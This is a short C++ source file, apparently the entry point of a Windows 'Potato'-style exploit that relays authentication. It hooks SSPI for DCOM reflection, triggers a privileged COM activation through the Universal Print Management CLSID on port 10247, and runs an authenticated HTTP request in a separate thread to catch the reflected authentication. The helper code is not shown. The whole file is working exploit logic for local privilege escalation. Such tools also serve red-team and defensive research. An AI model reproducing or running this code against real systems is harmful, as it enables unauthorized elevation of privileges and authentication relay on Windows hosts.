#include "Windows.h"
#include "stdio.h"
#include "DCOMReflection.h"
#include "PotatoTrigger.h"
#include "HTTPClient.h"

int wmain(int argc, wchar_t** argv) 
{
	WCHAR defaultClsidStr[] = L"{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}"; // Universal Print Management Manager Class CLSID
	WCHAR defaultComPort[] = L"10247";
	HANDLE hThread;

	hThread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(HTTPAuthenticatedGET), NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[-] Failed to create thread");
		return 0;
	}
	HookSSPIForDCOMReflection();
	PotatoTrigger(defaultClsidStr, defaultComPort, hThread);
	if (WaitForSingleObject(hThread, 3000) == WAIT_TIMEOUT) {
		printf("[-] The privileged process failed to communicate with our COM Server :(");
	}
	return 0;
}
